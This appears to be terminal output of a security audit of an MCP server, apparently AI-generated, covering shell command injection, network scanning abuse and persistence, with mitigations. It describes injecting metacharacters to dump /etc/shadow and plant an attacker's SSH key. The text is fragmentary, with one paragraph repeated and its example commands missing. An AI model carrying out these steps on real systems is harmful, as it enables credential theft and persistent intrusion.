      comprehensive logging, and file integrity monitoring are paramount to secure this implementation. Without these measures, the server is highly susceptible to complete compromise, allowing
      attackers to gain access, establish persistence, and exfiltrate sensitive data.

┃ As a security auditor analyzing the MCP Server, I've identified several critical vulnerabilities arising from the interaction between its assumed tools, prompts, and accessible resources.   ┃
┃ My analysis focuses on how an attacker could leverage these components to gain access, move laterally, establish persistence, and extract sensitive information.                              ┃
┃                                                                                                                                                                                               ┃

┃  • Vulnerability Explanation: The system_command_executor tool is designed to run arbitrary shell commands. If user input from prompts (e.g., "What action would you like to perform?") is    ┃
┃    not properly sanitized before being passed to this executor, an attacker can inject shell metacharacters (like &, |, ;, $(...), `) to execute arbitrary commands on the underlying system. ┃
┃    This is a severe vulnerability, often leading to full system compromise.                                                                                                                   ┃
┃  • Exploitation Example (Gaining Access, Dumping Credentials, Callback):                                                                                                                      ┃
┃     • Goal: Read sensitive files, add an SSH key for persistence, or get a reverse shell.                                                                                                     ┃
┃     • Scenario: The MCP Server presents a prompt like "What action would you like to perform? (e.g., 'list files', 'run command', 'scan network')". An attacker chooses "run command", and    ┃
┃       the subsequent input field for the command is vulnerable to injection.                                                                                                                  ┃

┃  • Vulnerability Explanation: The system_command_executor tool allows the MCP Server to run arbitrary shell commands. If user input from prompts (e.g., "What action would you like to        ┃
┃    perform?") is not meticulously sanitized, an attacker can inject shell metacharacters (e.g., ;, |, &, $(...)) to execute arbitrary commands. This is a critical vulnerability that can     ┃
┃    lead to full system compromise.                                                                                                                                                            ┃

┃       This would dump the hashed passwords from /etc/shadow into /tmp/shadow_dump.txt, which could then be retrieved via other means (e.g., file_manager).                                    ┃
┃     • Adding an Attacker's SSH Key for Persistence: An attacker could inject a command to add their public SSH key to a user's authorized_keys file:                                          ┃

┃     1 Strict Input Validation and Sanitization: Implement robust input validation to filter out or escape all shell metacharacters from user-provided input before it is passed to            ┃
┃       system_command_executor. Whitelisting allowed commands and arguments is preferred over blacklisting.                                                                                    ┃
┃     2 Principle of Least Privilege: Run the MCP server and its associated processes (including system_command_executor) with the lowest possible user privileges. If sudo is used, restrict   ┃
┃       sudoers entries to specific, whitelisted commands with no arguments or carefully controlled arguments.                                                                                  ┃
┃     3 Avoid Direct Shell Execution: Whenever possible, avoid constructing shell commands by concatenating user input directly. Instead, use specific API calls or subprocess execution with   ┃
┃       shell=False and properly quoted arguments.                                                                                                                                              ┃

┃  • Vulnerability Explanation: If the network_scanner tool allows arbitrary target specifications (IP addresses, ranges, domains) without restrictions or rate limiting, it can be abused for  ┃
┃    extensive internal network reconnaissance. An attacker can map network topology, discover active hosts, identify open ports and services, which is crucial for planning lateral movement   ┃
┃    and further attacks. It could also be used for Denial of Service (DoS) if scanning is aggressive.                                                                                          ┃

┃     1 Target Whitelisting: Restrict the network_scanner to operate only on pre-defined, safe IP ranges (e.g., localhost or explicitly approved external domains). Reject any user-provided    ┃
┃       arbitrary internal network segments.                                                                                                                                                    ┃

┃  • Vulnerability Explanation: This vulnerability overlaps with command injection and insecure file operations but highlights the critical goal of persistence. By abusing write access (via   ┃
┃    file_manager or command injection into system_command_executor), an attacker can establish long-term access by modifying system-wide startup scripts or user-specific SSH configurations.  ┃
┃  • Exploitation Examples:                                                                                                                                                                     ┃
